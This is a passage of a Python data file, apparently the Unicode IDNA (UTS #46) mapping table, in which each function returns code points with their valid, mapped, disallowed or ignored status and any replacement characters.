\'V\'),\n    (0x4FA, \'M\', \'\xd3\xbb\'),\n    (0x4FB, \'V\'),\n    (0x4FC, \'M\', \'\xd3\xbd\'),\n    (0x4FD, \'V\'),\n    (0x4FE, \'M\', \'\xd3\xbf\'),\n    (0x4FF, \'V\'),\n    (0x500, \'M\', \'\xd4\x81\'),\n    (0x501, \'V\'),\n    (0x502, \'M\', \'\xd4\x83\'),\n    ]\n\ndef _seg_9() -> List[Union[Tuple[int, str], Tuple[int, str, str]]]:\n    return [\n    (0x503, \'V\'),\n    (0x504, \'M\', \'\xd4\x85\'),\n    (0x505, \'V\'),\n    (0x506, \'M\', \'\xd4\x87\'),\n    (0x507, \'V\'),\n    (0x508, \'M\', \'\xd4\x89\'),\n    (0x509, \'V\'),\n    (0x50A, \'M\', \'\xd4\x8b\'),\n    (0x50B, \'V\'),\n    (0x50C, \'M\', \'\xd4\x8d\'),\n    (0x50D, \'V\'),\n    (0x50E, \'M\', \'\xd4\x8f\'),\n    (0x50F, \'V\'),\n    (0x510, \'M\', \'\xd4\x91\'),\n    (0x511, \'V\'),\n    (0x512, \'M\', \'\xd4\x93\'),\n    (0x513, \'V\'),\n    (0x514, \'M\', \'\xd4\x95\'),\n    (0x515, \'V\'),\n    (0x516, \'M\', \'\xd4\x97\'),\n    (0x517, \'V\'),\n    (0x518, \'M\', \'\xd4\x99\'),\n    (0x519, \'V\'),\n    (0x51A, \'M\', \'\xd4\x9b\'),\n    (0x51B, \'V\'),\n    (0x51C, \'M\', \'\xd4\x9d\'),\n    (0x51D, \'V\'),\n    (0x51E, \'M\', \'\xd4\x9f\'),\n    (0x51F, \'V\'),\n    (0x520, \'M\', \'\xd4\xa1\'),\n    (0x521, \'V\'),\n    (0x522, \'M\', \'\xd4\xa3\'),\n    (0x523, \'V\'),\n    (0x524, \'M\', \'\xd4\xa5\'),\n    (0x525, \'V\'),\n    (0x526, \'M\', \'\xd4\xa7\'),\n    (0x527, \'V\'),\n    (0x528, \'M\', \'\xd4\xa9\'),\n    (0x529, \'V\'),\n    (0x52A, \'M\', \'\xd4\xab\'),\n    (0x52B, \'V\'),\n    (0x52C, \'M\', \'\xd4\xad\'),\n    (0x52D, \'V\'),\n    (0x52E, \'M\', \'\xd4\xaf\'),\n    (0x52F, \'V\'),\n    (0x530, \'X\'),\n    (0x531, \'M\', \'\xd5\xa1\'),\n    (0x532, \'M\', \'\xd5\xa2\'),\n    (0x533, \'M\', \'\xd5\xa3\'),\n    (0x534, \'M\', \'\xd5\xa4\'),\n    (0x535, \'M\', \'\xd5\xa5\'),\n    (0x536, \'M\', \'\xd5\xa6\'),\n    (0x537, \'M\', \'\xd5\xa7\'),\n    (0x538, \'M\', \'\xd5\xa8\'),\n    (0x539, \'M\', \'\xd5\xa9\'),\n    (0x53A, \'M\', \'\xd5\xaa\'),\n    (0x53B, \'M\', \'\xd5\xab\'),\n    (0x53C, \'M\', \'\xd5\xac\'),\n    (0x53D, \'M\', \'\xd5\xad\'),\n    (0x53E, \'M\', \'\xd5\xae\'),\n    (0x53F, \'M\', \'\xd5\xaf\'),\n    (0x540, \'M\', \'\xd5\xb0\'),\n    (0x541, \'M\', \'\xd5\xb1\'),\n    (0x542, \'M\', \'\xd5\xb2\'),\n    (0x543, \'M\', \'\xd5\xb3\'),\n    (0x544, \'M\', \'\xd5\xb4\'),\n    (0x545, \'M\', \'\xd5\xb5\'),\n    (0x546, \'M\', \'\xd5\xb6\'),\n    (0x547, \'M\', \'\xd5\xb7\'),\n    (0x548, \'M\', \'\xd5\xb8\'),\n    (0x549, \'M\', \'\xd5\xb9\'),\n    (0x54A, \'M\', \'\xd5\xba\'),\n    (0x54B, \'M\', \'\xd5\xbb\'),\n    (0x54C, \'M\', \'\xd5\xbc\'),\n    (0x54D, \'M\', \'\xd5\xbd\'),\n    (0x54E, \'M\', \'\xd5\xbe\'),\n    (0x54F, \'M\', \'\xd5\xbf\'),\n    (0x550, \'M\', \'\xd6\x80\'),\n    (0x551, \'M\', \'\xd6\x81\'),\n    (0x552, \'M\', \'\xd6\x82\'),\n    (0x553, \'M\', \'\xd6\x83\'),\n    (0x554, \'M\', \'\xd6\x84\'),\n    (0x555, \'M\', \'\xd6\x85\'),\n    (0x556, \'M\', \'\xd6\x86\'),\n    (0x557, \'X\'),\n    (0x559, \'V\'),\n    (0x587, \'M\', \'\xd5\xa5\xd6\x82\'),\n    (0x588, \'V\'),\n    (0x58B, \'X\'),\n    (0x58D, \'V\'),\n    (0x590, \'X\'),\n    (0x591, \'V\'),\n    (0x5C8, \'X\'),\n    (0x5D0, \'V\'),\n    (0x5EB, \'X\'),\n    (0x5EF, \'V\'),\n    (0x5F5, \'X\'),\n    (0x606, \'V\'),\n    (0x61C, \'X\'),\n    (0x61D, \'V\'),\n    ]\n\ndef _seg_10() -> List[Union[Tuple[int, str], Tuple[int, str, str]]]:\n    return [\n    (0x675, \'M\', \'\xd8\xa7\xd9\xb4\'),\n    (0x676, \'M\', \'\xd9\x88\xd9\xb4\'),\n    (0x677, \'M\', \'\xdb\x87\xd9\xb4\'),\n    (0x678, \'M\', \'\xd9\x8a\xd9\xb4\'),\n    (0x679, \'V\'),\n    (0x6DD, \'X\'),\n    (0x6DE, \'V\'),\n    (0x70E, \'X\'),\n    (0x710, \'V\'),\n    (0x74B, \'X\'),\n    (0x74D, \'V\'),\n    (0x7B2, \'X\'),\n    (0x7C0, \'V\'),\n    (0x7FB, \'X\'),\n    (0x7FD, \'V\'),\n    (0x82E, \'X\'),\n    (0x830, \'V\'),\n    (0x83F, \'X\'),\n    (0x840, \'V\'),\n    (0x85C, \'X\'),\n    (0x85E, \'V\'),\n    (0x85F, \'X\'),\n    (0x860, \'V\'),\n    (0x86B, \'X\'),\n    (0x870, \'V\'),\n    (0x88F, \'X\'),\n    (0x898, \'V\'),\n    (0x8E2, \'X\'),\n    (0x8E3, \'V\'),\n    (0x958, \'M\', \'\xe0\xa4\x95\xe0\xa4\xbc\'),\n    (0x959, \'M\', \'\xe0\xa4\x96\xe0\xa4\xbc\'),\n    (0x95A, \'M\', \'\xe0\xa4\x97\xe0\xa4\xbc\'),\n    (0x95B, \'M\', \'\xe0\xa4\x9c\xe0\xa4\xbc\'),\n    (0x95C, \'M\', \'\xe0\xa4\xa1\xe0\xa4\xbc\'),\n    (0x95D, \'M\', \'\xe0\xa4\xa2\xe0\xa4\xbc\'),\n    (0x95E, \'M\', \'\xe0\xa4\xab\xe0\xa4\xbc\'),\n    (0x95F, \'M\', \'\xe0\xa4\xaf\xe0\xa4\xbc\'),\n    (0x960, \'V\'),\n    (0x984, \'X\'),\n    (0x985, \'V\'),\n    (0x98D, \'X\'),\n    (0x98F, \'V\'),\n    (0x991, \'X\'),\n    (0x993, \'V\'),\n    (0x9A9, \'X\'),\n    (0x9AA, \'V\'),\n    (0x9B1, \'X\'),\n    (0x9B2, \'V\'),\n    (0x9B3, \'X\'),\n    (0x9B6, \'V\'),\n    (0x9BA, \'X\'),\n    (0x9BC, \'V\'),\n    (0x9C5, \'X\'),\n    (0x9C7, \'V\'),\n    (0x9C9, \'X\'),\n    (0x9CB, \'V\'),\n    (0x9CF, \'X\'),\n    (0x9D7, \'V\'),\n    (0x9D8, \'X\'),\n    (0x9DC, \'M\', \'\xe0\xa6\xa1\xe0\xa6\xbc\'),\n    (0x9DD, \'M\', \'\xe0\xa6\xa2\xe0\xa6\xbc\'),\n    (0x9DE, \'X\'),\n    (0x9DF, \'M\', \'\xe0\xa6\xaf\xe0\xa6\xbc\'),\n    (0x9E0, \'V\'),\n    (0x9E4, \'X\'),\n    (0x9E6, \'V\'),\n    (0x9FF, \'X\'),\n    (0xA01, \'V\'),\n    (0xA04, \'X\'),\n    (0xA05, \'V\'),\n    (0xA0B, \'X\'),\n    (0xA0F, \'V\'),\n    (0xA11, \'X\'),\n    (0xA13, \'V\'),\n    (0xA29, \'X\'),\n    (0xA2A, \'V\'),\n    (0xA31, \'X\'),\n    (0xA32, \'V\'),\n    (0xA33, \'M\', \'\xe0\xa8\xb2\xe0\xa8\xbc\'),\n    (0xA34, \'X\'),\n    (0xA35, \'V\'),\n    (0xA36, \'M\', \'\xe0\xa8\xb8\xe0\xa8\xbc\'),\n    (0xA37, \'X\'),\n    (0xA38, \'V\'),\n    (0xA3A, \'X\'),\n    (0xA3C, \'V\'),\n    (0xA3D, \'X\'),\n    (0xA3E, \'V\'),\n    (0xA43, \'X\'),\n    (0xA47, \'V\'),\n    (0xA49, \'X\'),\n    (0xA4B, \'V\'),\n    (0xA4E, \'X\'),\n    (0xA51, \'V\'),\n    (0xA52, \'X\'),\n    (0xA59, \'M\', \'\xe0\xa8\x96\xe0\xa8\xbc\'),\n    (0xA5A, \'M\', \'\xe0\xa8\x97\xe0\xa8\xbc\'),\n    (0xA5B, \'M\', \'\xe0\xa8\x9c\xe0\xa8\xbc\'),\n    (0xA5C, \'V\'),\n    (0xA5D, \'X\'),\n    ]\n\ndef _seg_11() -> List[Union[Tuple[int, str], Tuple[int, str, str]]]:\n    return [\n    (0xA5E, \'M\', \'\xe0\xa8\xab\xe0\xa8\xbc\'),\n    (0xA5F, \'X\'),\n    (0xA66, \'V\'),\n    (0xA77, \'X\'),\n    (0xA81, \'V\'),\n    (0xA84, \'X\'),\n    (0xA85, \'V\'),\n    (0xA8E, \'X\'),\n    (0xA8F, \'V\'),\n    (0xA92, \'X\'),\n    (0xA93, \'V\'),\n    (0xAA9, \'X\'),\n    (0xAAA, \'V\'),\n    (0xAB1, \'X\'),\n    (0xAB2, \'V\'),\n    (0xAB4, \'X\'),\n    (0xAB5, \'V\'),\n    (0xABA, \'X\'),\n    (0xABC, \'V\'),\n    (0xAC6, \'X\'),\n    (0xAC7, \'V\'),\n    (0xACA, \'X\'),\n    (0xACB, \'V\'),\n    (0xACE, \'X\'),\n    (0xAD0, \'V\'),\n    (0xAD1, \'X\'),\n    (0xAE0, \'V\'),\n    (0xAE4, \'X\'),\n    (0xAE6, \'V\'),\n    (0xAF2, \'X\'),\n    (0xAF9, \'V\'),\n    (0xB00, \'X\'),\n    (0xB01, \'V\'),\n    (0xB04, \'X\'),\n    (0xB05, \'V\'),\n    (0xB0D, \'X\'),\n    (0xB0F, \'V\'),\n    (0xB11, \'X\'),\n    (0xB13, \'V\'),\n    (0xB29, \'X\'),\n    (0xB2A, \'V\'),\n    (0xB31, \'X\'),\n    (0xB32, \'V\'),\n    (0xB34, \'X\'),\n    (0xB35, \'V\'),\n    (0xB3A, \'X\'),\n    (0xB3C, \'V\'),\n    (0xB45, \'X\'),\n    (0xB47, \'V\'),\n    (0xB49, \'X\'),\n    (0xB4B, \'V\'),\n    (0xB4E, \'X\'),\n    (0xB55, \'V\'),\n    (0xB58, \'X\'),\n    (0xB5C, \'M\', \'\xe0\xac\xa1\xe0\xac\xbc\'),\n    (0xB5D, \'M\', \'\xe0\xac\xa2\xe0\xac\xbc\'),\n    (0xB5E, \'X\'),\n    (0xB5F, \'V\'),\n    (0xB64, \'X\'),\n    (0xB66, \'V\'),\n    (0xB78, \'X\'),\n    (0xB82, \'V\'),\n    (0xB84, \'X\'),\n    (0xB85, \'V\'),\n    (0xB8B, \'X\'),\n    (0xB8E, \'V\'),\n    (0xB91, \'X\'),\n    (0xB92, \'V\'),\n    (0xB96, \'X\'),\n    (0xB99, \'V\'),\n    (0xB9B, \'X\'),\n    (0xB9C, \'V\'),\n    (0xB9D, \'X\'),\n    (0xB9E, \'V\'),\n    (0xBA0, \'X\'),\n    (0xBA3, \'V\'),\n    (0xBA5, \'X\'),\n    (0xBA8, \'V\'),\n    (0xBAB, \'X\'),\n    (0xBAE, \'V\'),\n    (0xBBA, \'X\'),\n    (0xBBE, \'V\'),\n    (0xBC3, \'X\'),\n    (0xBC6, \'V\'),\n    (0xBC9, \'X\'),\n    (0xBCA, \'V\'),\n    (0xBCE, \'X\'),\n    (0xBD0, \'V\'),\n    (0xBD1, \'X\'),\n    (0xBD7, \'V\'),\n    (0xBD8, \'X\'),\n    (0xBE6, \'V\'),\n    (0xBFB, \'X\'),\n    (0xC00, \'V\'),\n    (0xC0D, \'X\'),\n    (0xC0E, \'V\'),\n    (0xC11, \'X\'),\n    (0xC12, \'V\'),\n    (0xC29, \'X\'),\n    (0xC2A, \'V\'),\n    ]\n\ndef _seg_12() -> List[Union[Tuple[int, str], Tuple[int, str, str]]]:\n    return [\n    (0xC3A, \'X\'),\n    (0xC3C, \'V\'),\n    (0xC45, \'X\'),\n    (0xC46, \'V\'),\n    (0xC49, \'X\'),\n    (0xC4A, \'V\'),\n    (0xC4E, \'X\'),\n    (0xC55, \'V\'),\n    (0xC57, \'X\'),\n    (0xC58, \'V\'),\n    (0xC5B, \'X\'),\n    (0xC5D, \'V\'),\n    (0xC5E, \'X\'),\n    (0xC60, \'V\'),\n    (0xC64, \'X\'),\n    (0xC66, \'V\'),\n    (0xC70, \'X\'),\n    (0xC77, \'V\'),\n    (0xC8D, \'X\'),\n    (0xC8E, \'V\'),\n    (0xC91, \'X\'),\n    (0xC92, \'V\'),\n    (0xCA9, \'X\'),\n    (0xCAA, \'V\'),\n    (0xCB4, \'X\'),\n    (0xCB5, \'V\'),\n    (0xCBA, \'X\'),\n    (0xCBC, \'V\'),\n    (0xCC5, \'X\'),\n    (0xCC6, \'V\'),\n    (0xCC9, \'X\'),\n    (0xCCA, \'V\'),\n    (0xCCE, \'X\'),\n    (0xCD5, \'V\'),\n    (0xCD7, \'X\'),\n    (0xCDD, \'V\'),\n    (0xCDF, \'X\'),\n    (0xCE0, \'V\'),\n    (0xCE4, \'X\'),\n    (0xCE6, \'V\'),\n    (0xCF0, \'X\'),\n    (0xCF1, \'V\'),\n    (0xCF3, \'X\'),\n    (0xD00, \'V\'),\n    (0xD0D, \'X\'),\n    (0xD0E, \'V\'),\n    (0xD11, \'X\'),\n    (0xD12, \'V\'),\n    (0xD45, \'X\'),\n    (0xD46, \'V\'),\n    (0xD49, \'X\'),\n    (0xD4A, \'V\'),\n    (0xD50, \'X\'),\n    (0xD54, \'V\'),\n    (0xD64, \'X\'),\n    (0xD66, \'V\'),\n    (0xD80, \'X\'),\n    (0xD81, \'V\'),\n    (0xD84, \'X\'),\n    (0xD85, \'V\'),\n    (0xD97, \'X\'),\n    (0xD9A, \'V\'),\n    (0xDB2, \'X\'),\n    (0xDB3, \'V\'),\n    (0xDBC, \'X\'),\n    (0xDBD, \'V\'),\n    (0xDBE, \'X\'),\n    (0xDC0, \'V\'),\n    (0xDC7, \'X\'),\n    (0xDCA, \'V\'),\n    (0xDCB, \'X\'),\n    (0xDCF, \'V\'),\n    (0xDD5, \'X\'),\n    (0xDD6, \'V\'),\n    (0xDD7, \'X\'),\n    (0xDD8, \'V\'),\n    (0xDE0, \'X\'),\n    (0xDE6, \'V\'),\n    (0xDF0, \'X\'),\n    (0xDF2, \'V\'),\n    (0xDF5, \'X\'),\n    (0xE01, \'V\'),\n    (0xE33, \'M\', \'\xe0\xb9\x8d\xe0\xb8\xb2\'),\n    (0xE34, \'V\'),\n    (0xE3B, \'X\'),\n    (0xE3F, \'V\'),\n    (0xE5C, \'X\'),\n    (0xE81, \'V\'),\n    (0xE83, \'X\'),\n    (0xE84, \'V\'),\n    (0xE85, \'X\'),\n    (0xE86, \'V\'),\n    (0xE8B, \'X\'),\n    (0xE8C, \'V\'),\n    (0xEA4, \'X\'),\n    (0xEA5, \'V\'),\n    (0xEA6, \'X\'),\n    (0xEA7, \'V\'),\n    (0xEB3, \'M\', \'\xe0\xbb\x8d\xe0\xba\xb2\'),\n    (0xEB4, \'V\'),\n    ]\n\ndef _seg_13() -> List[Union[Tuple[int, str], Tuple[int, str, str]]]:\n    return [\n    (0xEBE, \'X\'),\n    (0xEC0, \'V\'),\n    (0xEC5, \'X\'),\n    (0xEC6, \'V\'),\n    (0xEC7, \'X\'),\n    (0xEC8, \'V\'),\n    (0xECE, \'X\'),\n    (0xED0, \'V\'),\n    (0xEDA, \'X\'),\n    (0xEDC, \'M\', \'\xe0\xba\xab\xe0\xba\x99\'),\n    (0xEDD, \'M\', \'\xe0\xba\xab\xe0\xba\xa1\'),\n    (0xEDE, \'V\'),\n    (0xEE0, \'X\'),\n    (0xF00, \'V\'),\n    (0xF0C, \'M\', \'\xe0\xbc\x8b\'),\n    (0xF0D, \'V\'),\n    (0xF43, \'M\', \'\xe0\xbd\x82\xe0\xbe\xb7\'),\n    (0xF44, \'V\'),\n    (0xF48, \'X\'),\n    (0xF49, \'V\'),\n    (0xF4D, \'M\', \'\xe0\xbd\x8c\xe0\xbe\xb7\'),\n    (0xF4E, \'V\'),\n    (0xF52, \'M\', \'\xe0\xbd\x91\xe0\xbe\xb7\'),\n    (0xF53, \'V\'),\n    (0xF57, \'M\', \'\xe0\xbd\x96\xe0\xbe\xb7\'),\n    (0xF58, \'V\'),\n    (0xF5C, \'M\', \'\xe0\xbd\x9b\xe0\xbe\xb7\'),\n    (0xF5D, \'V\'),\n    (0xF69, \'M\', \'\xe0\xbd\x80\xe0\xbe\xb5\'),\n    (0xF6A, \'V\'),\n    (0xF6D, \'X\'),\n    (0xF71, \'V\'),\n    (0xF73, \'M\', \'\xe0\xbd\xb1\xe0\xbd\xb2\'),\n    (0xF74, \'V\'),\n    (0xF75, \'M\', \'\xe0\xbd\xb1\xe0\xbd\xb4\'),\n    (0xF76, \'M\', \'\xe0\xbe\xb2\xe0\xbe\x80\'),\n    (0xF77, \'M\', \'\xe0\xbe\xb2\xe0\xbd\xb1\xe0\xbe\x80\'),\n    (0xF78, \'M\', \'\xe0\xbe\xb3\xe0\xbe\x80\'),\n    (0xF79, \'M\', \'\xe0\xbe\xb3\xe0\xbd\xb1\xe0\xbe\x80\'),\n    (0xF7A, \'V\'),\n    (0xF81, \'M\', \'\xe0\xbd\xb1\xe0\xbe\x80\'),\n    (0xF82, \'V\'),\n    (0xF93, \'M\', \'\xe0\xbe\x92\xe0\xbe\xb7\'),\n    (0xF94, \'V\'),\n    (0xF98, \'X\'),\n    (0xF99, \'V\'),\n    (0xF9D, \'M\', \'\xe0\xbe\x9c\xe0\xbe\xb7\'),\n    (0xF9E, \'V\'),\n    (0xFA2, \'M\', \'\xe0\xbe\xa1\xe0\xbe\xb7\'),\n    (0xFA3, \'V\'),\n    (0xFA7, \'M\', \'\xe0\xbe\xa6\xe0\xbe\xb7\'),\n    (0xFA8, \'V\'),\n    (0xFAC, \'M\', \'\xe0\xbe\xab\xe0\xbe\xb7\'),\n    (0xFAD, \'V\'),\n    (0xFB9, \'M\', \'\xe0\xbe\x90\xe0\xbe\xb5\'),\n    (0xFBA, \'V\'),\n    (0xFBD, \'X\'),\n    (0xFBE, \'V\'),\n    (0xFCD, \'X\'),\n    (0xFCE, \'V\'),\n    (0xFDB, \'X\'),\n    (0x1000, \'V\'),\n    (0x10A0, \'X\'),\n    (0x10C7, \'M\', \'\xe2\xb4\xa7\'),\n    (0x10C8, \'X\'),\n    (0x10CD, \'M\', \'\xe2\xb4\xad\'),\n    (0x10CE, \'X\'),\n    (0x10D0, \'V\'),\n    (0x10FC, \'M\', \'\xe1\x83\x9c\'),\n    (0x10FD, \'V\'),\n    (0x115F, \'X\'),\n    (0x1161, \'V\'),\n    (0x1249, \'X\'),\n    (0x124A, \'V\'),\n    (0x124E, \'X\'),\n    (0x1250, \'V\'),\n    (0x1257, \'X\'),\n    (0x1258, \'V\'),\n    (0x1259, \'X\'),\n    (0x125A, \'V\'),\n    (0x125E, \'X\'),\n    (0x1260, \'V\'),\n    (0x1289, \'X\'),\n    (0x128A, \'V\'),\n    (0x128E, \'X\'),\n    (0x1290, \'V\'),\n    (0x12B1, \'X\'),\n    (0x12B2, \'V\'),\n    (0x12B6, \'X\'),\n    (0x12B8, \'V\'),\n    (0x12BF, \'X\'),\n    (0x12C0, \'V\'),\n    (0x12C1, \'X\'),\n    (0x12C2, \'V\'),\n    (0x12C6, \'X\'),\n    (0x12C8, \'V\'),\n    (0x12D7, \'X\'),\n    (0x12D8, \'V\'),\n    (0x1311, \'X\'),\n    (0x1312, \'V\'),\n    ]\n\ndef _seg_14() -> List[Union[Tuple[int, str], Tuple[int, str, str]]]:\n    return [\n    (0x1316, \'X\'),\n    (0x1318, \'V\'),\n    (0x135B, \'X\'),\n    (0x135D, \'V\'),\n    (0x137D, \'X\'),\n    (0x1380, \'V\'),\n    (0x139A, \'X\'),\n    (0x13A0, \'V\'),\n    (0x13F6, \'X\'),\n    (0x13F8, \'M\', \'\xe1\x8f\xb0\'),\n    (0x13F9, \'M\', \'\xe1\x8f\xb1\'),\n    (0x13FA, \'M\', \'\xe1\x8f\xb2\'),\n    (0x13FB, \'M\', \'\xe1\x8f\xb3\'),\n    (0x13FC, \'M\', \'\xe1\x8f\xb4\'),\n    (0x13FD, \'M\', \'\xe1\x8f\xb5\'),\n    (0x13FE, \'X\'),\n    (0x1400, \'V\'),\n    (0x1680, \'X\'),\n    (0x1681, \'V\'),\n    (0x169D, \'X\'),\n    (0x16A0, \'V\'),\n    (0x16F9, \'X\'),\n    (0x1700, \'V\'),\n    (0x1716, \'X\'),\n    (0x171F, \'V\'),\n    (0x1737, \'X\'),\n    (0x1740, \'V\'),\n    (0x1754, \'X\'),\n    (0x1760, \'V\'),\n    (0x176D, \'X\'),\n    (0x176E, \'V\'),\n    (0x1771, \'X\'),\n    (0x1772, \'V\'),\n    (0x1774, \'X\'),\n    (0x1780, \'V\'),\n    (0x17B4, \'X\'),\n    (0x17B6, \'V\'),\n    (0x17DE, \'X\'),\n    (0x17E0, \'V\'),\n    (0x17EA, \'X\'),\n    (0x17F0, \'V\'),\n    (0x17FA, \'X\'),\n    (0x1800, \'V\'),\n    (0x1806, \'X\'),\n    (0x1807, \'V\'),\n    (0x180B, \'I\'),\n    (0x180E, \'X\'),\n    (0x180F, \'I\'),\n    (0x1810, \'V\'),\n    (0x181A, \'X\'),\n    (0x1820, \'V\'),\n    (0x1879, \'X\'),\n    (0x1880, \'V\'),\n    (0x18AB, \'X\'),\n    (0x18B0, \'V\'),\n    (0x18F6, \'X\'),\n    (0x1900, \'V\'),\n    (0x191F, \'X\'),\n    (0x1920, \'V\'),\n    (0x192C, \'X\'),\n    (0x1930, \'V\'),\n    (0x193C, \'X\'),\n    (0x1940, \'V\'),\n    (0x1941, \'X\'),\n    (0x1944, \'V\'),\n    (0x196E, \'X\'),\n    (0x1970, \'V\'),\n    (0x1975, \'X\'),\n    (0x1980, \'V\'),\n    (0x19AC, \'X\'),\n    (0x19B0, \'V\'),\n    (0x19CA, \'X\'),\n    (0x19D0, \'V\'),\n    (0x19DB, \'X\'),\n    (0x19DE, \'V\'),\n    (0x1A1C, \'X\'),\n    (0x1A1E, \'V\'),\n    (0x1A5F, \'X\'),\n    (0x1A60, \'V\'),\n    (0x1A7D, \'X\'),\n    (0x1A7F, \'V\'),\n    (0x1A8A, \'X\'),\n    (0x1A90, \'V\'),\n    (0x1A9A, \'X\'),\n    (0x1AA0, \'V\'),\n    (0x1AAE, \'X\'),\n    (0x1AB0, \'V\'),\n    (0x1ACF, \'X\'),\n    (0x1B00, \'V\'),\n    (0x1B4D, \'X\'),\n    (0x1B50, \'V\'),\n    (0x1B7F, \'X\'),\n    (0x1B80, \'V\'),\n    (0x1BF4, \'X\'),\n    (0x1BFC, \'V\'),\n    (0x1C38, \'X\'),\n    (0x1C3B, \'V\'),\n    (0x1C4A, \'X\'),\n    (0x1C4D, \'V\'),\n    (0x1C80, \'M\', \'\xd0\xb2\'),\n    ]\n\ndef _seg_15() -> List[Union[Tuple[int, str], Tuple[int, str, str]]]:\n    return [\n    (0x1C81, \'M\', \'\xd0\xb4\'),\n    (0x1C82, \'M\', \'\xd0\xbe\'),\n    (0x1C83, \'M\', \'\xd1\x81\'),\n    (0x1C84, \'M\', \'\xd1\x82\'),\n    (0x1C86, \'M\', \'\xd1\x8a\'),\n    (0x1C87, \'M\', \'\xd1\xa3\'),\n    (0x1C88, \'M\', \'\xea\x99\x8b\'),\n    (0x1C89, \'X\'),\n    (0x1C90, \'M\', \'\xe1\x83\x90\'),\n    (0x1C91, \'M\', \'\xe1\x83\x91\'),\n    (0x1C92, \'M\', \'\xe1\x83\x92\'),\n    (0x1C93, \'M\', \'\xe1\x83\x93\'),\n    (0x1C94, \'M\', \'\xe1\x83\x94\'),\n    (0x1C95, \'M\', \'\xe1\x83\x95\'),\n    (0x1C96, \'M\', \'\xe1\x83\x96\'),\n    (0x1C97, \'M\', \'\xe1\x83\x97\'),\n    (0x1C98, \'M\', \'\xe1\x83\x98\'),\n    (0x1C99, \'M\', \'\xe1\x83\x99\'),\n    (0x1C9A, \'M\', \'\xe1\x83\x9a\'),\n    (0x1C9B, \'M\', \'\xe1\x83\x9b\'),\n    (0x1C9C, \'M\', \'\xe1\x83\x9c\'),\n    (0x1C9D, \'M\', \'\xe1\x83\x9d\'),\n    (0x1C9E, \'M\', \'\xe1\x83\x9e\'),\n    (0x1C9F, \'M\', \'\xe1\x83\x9f\'),\n    (0x1CA0, \'M\', \'\xe1\x83\xa0\'),\n    (0x1CA1, \'M\', \'\xe1\x83\xa1\'),\n    (0x1CA2, \'M\', \'\xe1\x83\xa2\'),\n    (0x1CA3, \'M\', \'\xe1\x83\xa3\'),\n    (0x1CA4, \'M\', \'\xe1\x83\xa4\'),\n    (0x1CA5, \'M\', \'\xe1\x83\xa5\'),\n    (0x1CA6, \'M\', \'\xe1\x83\xa6\'),\n    (0x1CA7, \'M\', \'\xe1\x83\xa7\'),\n    (0x1CA8, \'M\', \'\xe1\x83\xa8\'),\n    (0x1CA9, \'M\', \'\xe1\x83\xa9\'),\n    (0x1CAA, \'M\', \'\xe1\x83\xaa\'),\n    (0x1CAB, \'M\', \'\xe1\x83\xab\'),\n    (0x1CAC, \'M\', \'\xe1\x83\xac\'),\n    (0x1CAD, \'M\', \'\xe1\x83\xad\'),\n    (0x1CAE, \'M\', \'\xe1\x83\xae\'),\n    (0x1CAF, \'M\', \'\xe1\x83\xaf\'),\n    (0x1CB0, \'M\', \'\xe1\x83\xb0\'),\n    (0x1CB1, \'M\', \'\xe1\x83\xb1\'),\n    (0x1CB2, \'M\', \'\xe1\x83\xb2\'),\n    (0x1CB3, \'M\', \'\xe1\x83\xb3\'),\n    (0x1CB4, \'M\', \'\xe1\x83\xb4\'),\n    (0x1CB5, \'M\', \'\xe1\x83\xb5\'),\n    (0x1CB6, \'M\', \'\xe1\x83\xb6\'),\n    (0x1CB7, \'M\', \'\xe1\x83\xb7\'),\n    (0x1CB8, \'M\', \'\xe1\x83\xb8\'),\n    (0x1CB9, \'M\', \'\xe1\x83\xb9\'),\n    (0x1CBA, \'M\', \'\xe1\x83\xba\'),\n    (0x1CBB, \'X\'),\n    (0x1CBD, \'M\', \'\xe1\x83\xbd\'),\n    (0x1CBE, \'M\', \'\xe1\x83\xbe\'),\n    (0x1CBF, \'M\', \'\xe1\x83\xbf\'),\n    (0x1CC0, \'V\'),\n    (0x1CC8, \'X\'),\n    (0x1CD0, \'V\'),\n    (0x1CFB, \'X\'),\n    (0x1D00, \'V\'),\n    (0x1D2C, \'M\', \'a\'),\n    (0x1D2D, \'M\', \'\xc3\xa6\'),\n    (0x1D2E, \'M\', \'b\'),\n    (0x1D2F, \'V\'),\n    (0x1D30, \'M\', \'d\'),\n    (0x1D31, \'M\', \'e\'),\n    (0x1D32, \'M\', \'\xc7\x9d\'),\n    (0x1D33, \'M\', \'g\'),\n    (0x1D34, \'M\', \'h\'),\n    (0x1D35, \'M\', \'i\'),\n    (0x1D36, \'M\', \'j\'),\n    (0x1D37, \'M\', \'k\'),\n    (0x1D38, \'M\', \'l\'),\n    (0x1D39, \'M\', \'m\'),\n    (0x1D3A, \'M\', \'n\'),\n    (0x1D3B, \'V\'),\n    (0x1D3C, \'M\', \'o\'),\n    (0x1D3D, \'M\', \'\xc8\xa3\'),\n    (0x1D3E, \'M\', \'p\'),\n    (0x1D3F, \'M\', \'r\'),\n    (0x1D40, \'M\', \'t\'),\n    (0x1D41, \'M\', \'u\'),\n    (0x1D42, \'M\', \'w\'),\n    (0x1D43, \'M\', \'a\'),\n    (0x1D44, \'M\', \'\xc9\x90\'),\n    (0x1D45, \'M\', \'\xc9\x91\'),\n    (0x1D46, \'M\', \'\xe1\xb4\x82\'),\n    (0x1D47, \'M\', \'b\'),\n    (0x1D48, \'M\', \'d\'),\n    (0x1D49, \'M\', \'e\'),\n    (0x1D4A, \'M\', \'\xc9\x99\'),\n    (0x1D4B, \'M\', \'\xc9\x9b\'),\n    (0x1D4C, \'M\', \'\xc9\x9c\'),\n    (0x1D4D, \'M\', \'g\'),\n    (0x1D4E, \'V\'),\n    (0x1D4F, \'M\', \'k\'),\n    (0x1D50, \'M\', \'m\'),\n    (0x1D51, \'M\', \'\xc5\x8b\'),\n    (0x1D52, \'M\', \'o\'),\n    (0x1D53, \'M\', \'\xc9\x94\'),\n    ]\n\ndef _seg_16() -> List[Union[Tuple[int, str], Tuple[int, str, str]]]:\n    return [\n    (0x1D54, \'M\', \'\xe1\xb4\x96\'),\n    (0x1D55, \'M\', \'\xe1\xb4\x97\'),\n    (0x1D56, \'M\', \'p\'),\n    (0x1D57, \'M\', \'t\'),\n    (0x1D58, \'M\', \'u\'),\n    (0x1D59, \'M\', \'\xe1\xb4\x9d\'),\n    (0x1D5A, \'M\', \'\xc9\xaf\'),\n    (0x1D5B, \'M\', \'v\'),\n    (0x1D5C, \'M\', \'\xe1\xb4\xa5\'),\n    (0x1D5D, \'M\', \'\xce\xb2\'),\n    (0x1D5E, \'M\', \'\xce\xb3\'),\n    (0x1D5F, \'M\', \'\xce\xb4\'),\n    (0x1D60, \'M\', 